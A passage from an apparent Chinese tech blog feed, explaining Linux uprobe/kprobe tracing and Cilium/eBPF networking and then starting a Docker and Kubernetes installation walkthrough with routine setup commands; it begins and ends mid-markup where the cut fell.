_raw_spin_lock</span><br><span class="line">     0.32%  ld-2.31.so        [.] 0x000000000000e304</span><br><span class="line">     0.30%  perf              [.] perf_hpp__is_dynamic_entry</span><br><span class="line">     0.30%  [kernel]          [k] __schedule</span><br><span class="line">     0.29%  dockerd           [.] crypto/sha256.block</span><br><span class="line">     0.29%  perf              [.] evsel__parse_sample</span><br><span class="line">     0.29%  perf              [.] hpp__sort_overhead</span><br><span class="line">     0.28%  [kernel]          [k] copy_user_generic_unrolled</span><br><span class="line">     0.28%  [kernel]          [k] filemap_map_pages</span><br><span class="line">     0.27%  dockerd           [.] runtime.mallocgc</span><br><span class="line">     0.26%  [kernel]          [k] __handle_mm_fault</span><br><span class="line">     0.26%  kube-apiserver    [.] 0x0000000001068802</span><br><span class="line">     0.26%  [kernel]          [k] __d_lookup_rcu</span><br><span class="line">     0.26%  [kernel]          [k] memcg_kmem_get_cache</span><br><span class="line">     0.25%  [kernel]          [k] __d_lookup</span><br><span class="line">     0.23%  dockerd           [.] runtime.scanobject</span><br><span class="line">     0.23%  perf              [.] sort__sym_cmp</span><br><span class="line">     0.22%  [kernel]          [k] kmem_cache_alloc</span><br><span class="line">     0.21%  [kernel]          [k] rcu_all_qs</span><br><span class="line">     0.21%  [kernel]          [k] handle_mm_fault</span><br><span class="line">     0.19%  [kernel]          [k] __run_timers.part.0</span><br><span class="line">     0.19%  [kernel]          [k] free_unref_page_list</span><br></pre></td></tr></table></figure><h5 id="uprobes"><a href="#uprobes" class="headerlink" title="uprobes"></a>uprobes</h5><p>uprobe是用户态的探针，它和kprobe是相对应的，kprobe是内核态的探针。uprobe需要制定用户态探针在执行文件中的位置，插入探针的原理和kprobe类似。</p><p>准备一个测试代码<code>demo.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_info</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"current count = %d\n"</span>,count);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      print_info();</span><br><span class="line">      system(<span class="string">"sleep 1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/uprobe# gcc demo.c -o demo</span><br><span class="line">root@ubuntu:~/uprobe# ./demo </span><br><span class="line">current count = 0</span><br><span class="line">current count = 1</span><br><span class="line">current count = 2</span><br><span class="line">current count = 3</span><br><span class="line">current count = 4</span><br><span class="line">current count = 5</span><br><span class="line">current count = 6</span><br><span class="line">current count = 7</span><br></pre></td></tr></table></figure><p>这个时候如果程序出现问题，我们就可以通过uprobe查看相关信息。</p><p>首先通过<code>objdump</code>查看相关段的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/uprobe# objdump -t demo | grep print</span><br><span class="line">0000000000000000       F *UND*0000000000000000              printf@@GLIBC_2.2.5</span><br><span class="line">0000000000001169 g     F .text0000000000000033              print_info</span><br></pre></td></tr></table></figure><p>添加程序相关信息到uprobe点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/uprobe# cat /sys/kernel/debug/tracing/uprobe_events </span><br><span class="line">root@ubuntu:~/uprobe# echo 'p:print_info ~/uprobe/demo:0x1169 %ip %ax' &gt; /sys/kernel/debug/tracing/uprobe_events</span><br><span class="line">root@ubuntu:~/uprobe# cat /sys/kernel/debug/tracing/uprobe_events</span><br><span class="line">p:uprobes/print_info ~/uprobe/demo:0x0000000000001169 arg1=%ip arg2=%ax</span><br></pre></td></tr></table></figure><p>打开日志追踪</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/uprobe# echo 1 &gt; /sys/kernel/debug/tracing/events/uprobes/enable</span><br></pre></td></tr></table></figure><p>查看日志信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/uprobe# cat /sys/kernel/debug/tracing/trace</span><br><span class="line"><span class="meta">#</span> tracer: nop</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span> entries-in-buffer/entries-written: 10/10   #P:4</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span>                              _-----=&gt; irqs-off</span><br><span class="line"><span class="meta">#</span>                             / _----=&gt; need-resched</span><br><span class="line"><span class="meta">#</span>                            | / _---=&gt; hardirq/softirq</span><br><span class="line"><span class="meta">#</span>                            || / _--=&gt; preempt-depth</span><br><span class="line"><span class="meta">#</span>                            ||| /     delay</span><br><span class="line"><span class="meta">#</span>           TASK-PID   CPU#  ||||    TIMESTAMP  FUNCTION</span><br><span class="line"><span class="meta">#</span>              | |       |   ||||       |         |</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239242.207371: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239243.212293: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239244.217997: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [000] d... 1239245.235024: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239246.240172: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239247.247020: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239248.255470: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239249.260487: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [001] d... 1239250.266369: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [001] d... 1239251.271204: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br></pre></td></tr></table></figure><p>关闭及清理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/uprobe# echo 0 &gt; /sys/kernel/debug/tracing/events/uprobes/enable</span><br><span class="line">root@ubuntu:~/uprobe# &gt; /sys/kernel/debug/tracing/trace</span><br></pre></td></tr></table></figure><h5 id="kprobe"><a href="#kprobe" class="headerlink" title="kprobe"></a>kprobe</h5><p>Kprobe是一种内核调测手段，它可以动态地跟踪内核的行为、收集debug信息和性能信息。</p><p>查看<code>do_sys_open</code>系统调用的详细信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# echo 'r:myprobe do_sys_open' &gt; /sys/kernel/debug/tracing/kprobe_events </span><br><span class="line">root@ubuntu:~# cat /sys/kernel/debug/tracing/kprobe_events</span><br><span class="line">r4:kprobes/myprobe do_sys_open</span><br></pre></td></tr></table></figure><p>打开日志追踪</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# echo 1 &gt; /sys/kernel/debug/tracing/events/kprobes/enable</span><br></pre></td></tr></table></figure><p>查看调用信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# cat /sys/kernel/debug/tracing/trace</span><br></pre></td></tr></table></figure><h4 id="网络跟踪"><a href="#网络跟踪" class="headerlink" title="网络跟踪"></a>网络跟踪</h4><ul><li>BPF XDP</li><li>BPF TC hooks</li><li>BPF Cgroups</li><li>BPF sockmap and sockops</li><li>BPF system calls</li></ul><p><img src="/2022/03/18/略知一二之Cilium/5.png" alt="5"></p><h4 id="Cilium-vs-Kube-router"><a href="#Cilium-vs-Kube-router" class="headerlink" title="Cilium vs Kube-router"></a>Cilium vs Kube-router</h4><p><img src="/2022/03/18/略知一二之Cilium/6.png" alt="6"></p><h5 id="VxLan"><a href="#VxLan" class="headerlink" title="VxLan"></a>VxLan</h5><p><code>VxLan</code>（Virtual eXtensible Local Area Network，虚拟可扩展局域网），是一种虚拟化隧道通信技术。它是一种 Overlay（覆盖网络）技术，通过三层的网络来搭建虚拟的二层网络。</p><p>简单来讲，<code>VxLan</code>是在底层物理网络（underlay）之上使用隧道技术，借助 <code>UDP</code> 层构建的 Overlay 的逻辑网络，使逻辑网络与物理网络解耦，实现灵活的组网需求。它对原有的网络架构几乎没有影响，不需要对原网络做任何改动，即可架设一层新的网络。也正是因为这个特性，很多CNI插件会选择 <code>VxLan</code> 作为通信网络。</p><p><code>VxLan</code> 不仅支持一对一，也支持一对多，一个 <code>VxLan</code> 设备能通过像网桥一样的学习方式学习到其他对端的 IP 地址，还可以直接配置静态转发表。</p><p>VxLan常见术语</p><ul><li><p>VTEP（VXLAN Tunnel Endpoints，VxLan 隧道端点）</p><p>VxLan 网络的边缘设备，用来进行VxLan报文的处理（封包和解包）。VTEP 可以是网络设备（比如交换机），也可以是一台机器（比如虚拟化集群中的宿主机）。</p></li><li><p>VNI（VxLan Network Identifier，VxLan 网络标识符）</p><p><code>VNI</code> 是每个 VXLAN 段的标识，是个 24 位整数，一共有16777216个，一般每个 <code>VNI</code> 对应一个租户，也就是说使用 <code>VxLan</code> 搭建的公有云可以理论上可以支撑千万级别的租户。</p></li><li><p>Tunnel（VxLan 隧道）</p><p>隧道是一个逻辑上的概念，在 VxLan 模型中并没有具体的物理实体向对应。隧道可以看做是一种虚拟通道，VxLan 通信双方认为自己是在直接通信，并不知道底层网络的存在。从整体来说，每个 VxLan 网络像是为通信的虚拟机搭建了一个单独的通信通道，也就是隧道。</p></li></ul><h4 id="Cilium组件"><a href="#Cilium组件" class="headerlink" title="Cilium组件"></a>Cilium组件</h4><h5 id="Cilium-agent"><a href="#Cilium-agent" class="headerlink" title="Cilium agent"></a>Cilium agent</h5><ul><li>以Node为单位</li><li>采用DaemonSet方式部署</li><li>通过CNI插件与CRI和Kubernetes交互</li><li>采用IPAM地址分配方式</li><li>生成eBPF程序，编译字节码，Attach到内核</li></ul><p><img src="/2022/03/18/略知一二之Cilium/7.jpeg" alt="7"></p><h5 id="Cilium-operator"><a href="#Cilium-operator" class="headerlink" title="Cilium operator"></a>Cilium operator</h5><p><img src="/2022/03/18/略知一二之Cilium/8.png" alt="8"></p><h5 id="Cilium控制平面"><a href="#Cilium控制平面" class="headerlink" title="Cilium控制平面"></a>Cilium控制平面</h5><p>创建一个Pod的流程</p><ul><li>kubectl将对应的请求发给API Server</li><li>API Server将对应的pod信息写到etcd中</li><li>Scheduler服务会watch API Server，选择合适的节点</li><li>kublet调用CRI-Containerd创建容器</li><li>创建对应的容器网络，调用CNI-Plugin，即调用Cilium agent</li><li>Cilium agent创建对应的网络，调用<code>bpf_syscall()</code></li></ul><p><img src="/2022/03/18/略知一二之Cilium/9.png" alt="9"></p><h5 id="Cilium数据平面-ipvs-iptables"><a href="#Cilium数据平面-ipvs-iptables" class="headerlink" title="Cilium数据平面-ipvs/iptables"></a>Cilium数据平面-ipvs/iptables</h5><p>从网卡到Pod经历了哪些点</p><p><img src="/2022/03/18/略知一二之Cilium/10.png" alt="10"></p><ul><li>经过eth0，此时数据放在Ring Buffer中，内核会通过NAPI轮训调取Ring Buffer数据</li><li>经过XDP，对数据进行PASS、DROP等操作，前提是网卡支持XDP</li><li>内核给数据分配skb，skb是网络在内核中的结构体</li><li>经过GRO，将数据包进行组合封包，提升网络吞吐</li><li>经过TC ingress，包括流量限速，流量整形，策略应用等操作</li><li>经过Netfilter</li><li>经过TC egress，出口流量的队列调度等操作</li><li>经过GSO，将大封包转为小封包</li><li>本地流量走第17步，远程流量走第18步</li></ul><h5 id="Cilium数据平面-eBPF"><a href="#Cilium数据平面-eBPF" class="headerlink" title="Cilium数据平面-eBPF"></a>Cilium数据平面-eBPF</h5><p><img src="/2022/03/18/略知一二之Cilium/11.png" alt="11"></p><h5 id="Cilium数据平面-service转发"><a href="#Cilium数据平面-service转发" class="headerlink" title="Cilium数据平面-service转发"></a>Cilium数据平面-service转发</h5><ul><li>南北向流量：XDP或TC</li><li>东西向流量：BPF socket</li></ul><h5 id="Cilium数据转发与tc-hook"><a href="#Cilium数据转发与tc-hook" class="headerlink" title="Cilium数据转发与tc hook"></a>Cilium数据转发与tc hook</h5><p><img src="/2022/03/18/略知一二之Cilium/12.png" alt="12"></p><p>Cilium 在主机网络空间上创建了三个虚拟接口：ciliumhost、ciliumnet和ciliumvxlan。Cilium Agent 在启动时创建一个名为“ciliumhost -&gt; ciliumnet”的 veth 对，并将 CIDR 的第一个IP地址设置为 ciliumhost，然后作为 CIDR 的网关。CNI 插件会生成 BPF 规则，编译后注入内核，以解决veth对之间的连通问题。</p><h5 id="Cilium组网模式-VxLan"><a href="#Cilium组网模式-VxLan" class="headerlink" title="Cilium组网模式-VxLan"></a>Cilium组网模式-VxLan</h5><p><img src="/2022/03/18/略知一二之Cilium/13.png" alt="13"></p><h5 id="Cilium组网模式-BGP-router"><a href="#Cilium组网模式-BGP-router" class="headerlink" title="Cilium组网模式-BGP router"></a>Cilium组网模式-BGP router</h5><p><img src="/2022/03/18/略知一二之Cilium/14.png" alt="14"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://www.cnxct.com/how-does-cilium-use-ebpf-with-go-and-c/" target="_blank" rel="noopener">https://www.cnxct.com/how-does-cilium-use-ebpf-with-go-and-c/</a></li><li><a href="https://rexrock.github.io/post/cilium2/" target="_blank" rel="noopener">https://rexrock.github.io/post/cilium2/</a></li><li><a href="https://arthurchiao.art/blog/understanding-ebpf-datapath-in-cilium-zh/" target="_blank" rel="noopener">https://arthurchiao.art/blog/understanding-ebpf-datapath-in-cilium-zh/</a></li><li><a href="https://www.bookstack.cn/read/cilium-1.10-en/0caa2e34522dac68.md" target="_blank" rel="noopener">https://www.bookstack.cn/read/cilium-1.10-en/0caa2e34522dac68.md</a></li><li><a href="https://docs.cilium.io/en/v0.12/intro/" target="_blank" rel="noopener">https://docs.cilium.io/en/v0.12/intro/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;What-is-Cilium？&quot;&gt;&lt;a href=&quot;#What-is-Cilium？&quot; class=&quot;headerlink&quot; title=&quot;What is Cilium？&quot;&gt;&lt;/a&gt;What is Cilium？&lt;/h4&gt;&lt;p&gt;Cilium is open sou
      
    
    </summary>
    
    
      <category term="Cloud Security" scheme="elssm.github.io/tags/Cloud-Security/"/>
    
  </entry>
  
  <entry>
    <title>从0到0.5:eBPF加速ServiceMesh实践</title>
    <link href="elssm.github.io/2022/02/28/%E4%BB%8E0%E5%88%B00-5-eBPF%E5%8A%A0%E9%80%9FServiceMesh%E5%AE%9E%E8%B7%B5/"/>
    <id>elssm.github.io/2022/02/28/从0到0-5-eBPF加速ServiceMesh实践/</id>
    <published>2022-02-28T05:06:42.000Z</published>
    <updated>2022-03-08T03:16:03.067Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><h5 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h5><h6 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br></pre></td></tr></table></figure><h6 id="导入存储库的GPG密钥"><a href="#导入存储库的GPG密钥" class="headerlink" title="导入存储库的GPG密钥"></a>导入存储库的GPG密钥</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><h6 id="添加Docker-APT存储库到系统"><a href="#添加Docker-APT存储库到系统" class="headerlink" title="添加Docker APT存储库到系统"></a>添加Docker APT存储库到系统</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</span><br></pre></td></tr></table></figure><h6 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p>docker版本：20.10.12</p><p>查看docker服务启动状况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# systemctl status docker</span><br><span class="line">● docker.service - Docker Application Container Engine</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled</span><br><span class="line">   Active: active (running) since Thu 2022-02-10 07:23:33 UTC; 10min ago</span><br><span class="line">     Docs: https://docs.docker.com</span><br><span class="line"> Main PID: 2663 (dockerd)</span><br><span class="line">    Tasks: 9</span><br><span class="line">   CGroup: /system.slice/docker.service</span><br><span class="line">           └─2663 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.so</span><br><span class="line"></span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.763625795Z" level=warn</span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.763656800Z" level=warn</span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.763676563Z" level=warn</span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.764235662Z" level=info</span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.961536719Z" level=info</span><br><span class="line">Feb 10 07:23:33 ubuntu dockerd[2663]: time="2022-02-10T07:23:33.039790463Z" level=info</span><br><span class="line">Feb 10 07:23:33 ubuntu dockerd[2663]: time="2022-02-10T07:23:33.070305288Z" level=info</span><br><span class="line">Feb 10 07:23:33 ubuntu dockerd[2663]: time="2022-02-10T07:23:33.070463909Z" level=info</span><br><span class="line">Feb 10 07:23:33 ubuntu systemd[1]: Started Docker Application Container Engine.</span><br></pre></td></tr></table></figure><h5 id="Kubernetes安装"><a href="#Kubernetes安装" class="headerlink" title="Kubernetes安装"></a>Kubernetes安装</h5><h6 id="安装https工具使得apt支持ssl传输"><a href="#安装https工具使得apt支持ssl传输" class="headerlink" title="安装https工具使得apt支持ssl传输"></a>安装https工具使得apt支持ssl传输</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y apt-transport-https</span><br></pre></td></tr></table></figure><h6 id="使用阿里云的源"><a href="#使用阿里云的源" class="headerlink" title="使用阿里云的源"></a>使用阿里云的源</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add -</span><br><span class="line">echo "deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main" &gt; /etc/apt/sources.list.d/kubernetes.list</span><br></pre></td></tr></table></figure><h6 id="或使用中科大的源"><a href="#或使用中科大的源" class="headerlink" title="或使用中科大的源"></a>或使用中科大的源</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt; /etc/apt/sources.list.d/kubernetes.list</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kubernetes/apt kubernetes-xenial main</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>更新apt报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  The following signatures couldn't be verified because the public key is not available: NO_PUBKEY FEEA9169307EA071 NO_PUBKEY 8B57C5C2836F4BEB</span><br><span class="line">Reading package lists... Done</span><br><span class="line">W: GPG error: http://mirrors.ustc.edu.cn/kubernetes/apt kubernetes-xenial InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY FEEA9169307EA071 NO_PUBKEY 8B57C5C2836F4BEB</span><br><span class="line">E: The repository 'http://mirrors.ustc.edu.cn/kubernetes/apt kubernetes-xenial InRelease' is not signed.</span><br><span class="line">N: Updating from such a repository can't be done securely, and is therefore disabled by default.</span><br><span class="line">N: See apt-secure(8) manpage for repository creation and user configuration details.</span><br></pre></td></tr></table></figure><p>报错提示我们需要制作一个key，其中<code>836F4BEB</code>是<code>NO_PUBKEY</code>的后八位</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg --keyserver keyserver.ubuntu.com --recv-keys 836F4BEB</span><br><span class="line">gpg --export --armor  836F4BEB | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>之后重新<code>apt-get update</code>即可</p><h6 id="下载相关工具"><a href="#下载相关工具" class="headerlink" title="下载相关工具"></a>下载相关工具</h6><p>修改docker的<code>daemon.json</code>，将cgroup驱动和k8s设置为一致</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu1:~# cat /etc/docker/daemon.json</span><br><span class="line">    &#123;</span><br><span class="line">        "exec-opts": ["native.cgroupdriver=systemd"],</span><br><span class="line">        "registry-mirrors": [</span><br><span class="line">        "https://docker.mirrors.ustc.edu.cn/",</span><br><span class="line">        "https://hub-mirror.c.163.com"],</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y kubelet kubeadm kubectl</span><br></pre></td></tr></table></figure><h6 id="查看k8s版本"><a href="#查看k8s版本" class="headerlink" title="查看k8s版本"></a>查看k8s版本</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl version</span><br><span class="line">Client Version: version.Info&#123;Major:"1", Minor:"23", GitVersion:"v1.23.3", GitCommit:"816c97ab8cff8a1c72eccca1026f7820e93e0d25", GitTreeState:"clean", BuildDate:"2022-01-25T21:25:17Z", GoVersion:"go1.17.6", Compiler:"gc", Platform:"linux/amd64"&#125;</span><br><span class="line">Server Version: version.Info&#123;Major:"1", Minor:"23", GitVersion:"v1.23.3", GitCommit:"816c97ab8cff8a1c72eccca1026f7820e93e0d25", GitTreeState:"clean", BuildDate:"2022-01-25T21:19:12Z", GoVersion:"go1.17.6", Compiler:"gc", Platform:"linux/amd64"&#125;</span><br></pre></td></tr></table></figure><h6 id="初始化master节点"><a href="#初始化master节点" class="headerlink" title="初始化master节点"></a>初始化master节点</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init \</span><br><span class="line">--apiserver-advertise-address=192.168.19.84 \</span><br><span class="line">--image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">--pod-network-cidr=10.244.0.0/16</span><br></pre></td></tr></table></figure><h6 id="配置kubectl工具"><a href="#配置kubectl工具" class="headerlink" title="配置kubectl工具"></a>配置kubectl工具</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br></pre></td></tr></table></figure><h6 id="查看节点状态"><a href="#查看节点状态" class="headerlink" title="查看节点状态"></a>查看节点状态</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get nodes</span><br><span class="line">NAME     STATUS     ROLES                  AGE   VERSION</span><br><span class="line">ubuntu   NotReady   control-plane,master   15m   v1.23.3</span><br></pre></td></tr></table></figure><p>状态显示为<code>NotReady</code>，查看日志，发现没有安装网络插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# journalctl -u kubelet -f</span><br><span class="line">-- Logs begin at Mon 2020-02-24 09:48:27 UTC. --</span><br><span class="line">Feb 10 08:08:58 ubuntu kubelet[11230]: I0210 08:08:58.892005   11230 cni.go:240] "Unable to update cni config" err="no networks found in /etc/cni/net.d"</span><br></pre></td></tr></table></figure><h6 id="安装pod插件flannel"><a href="#安装pod插件flannel" class="headerlink" title="安装pod插件flannel"></a>安装pod插件flannel</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br><span class="line">Warning: policy/v1beta1 PodSecurityPolicy is deprecated in v1.21+, unavailable in v1.25+</span><br><span class="line">podsecuritypolicy.policy/psp.flannel.unprivileged created</span><br><span class="line">clusterrole.rbac.authorization.k8s.io/flannel created</span><br><span class="line">clusterrolebinding.rbac.authorization.k8s.io/flannel created</span><br><span class="line">serviceaccount/flannel created</span><br><span class="line">configmap/kube-flannel-cfg created</span><br><span class="line">daemonset.apps/kube-flannel-ds created</span><br></pre></td></tr></table></figure><h6 id="再次查看节点状态"><a href="#再次查看节点状态" class="headerlink" title="再次查看节点状态"></a>再次查看节点状态</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 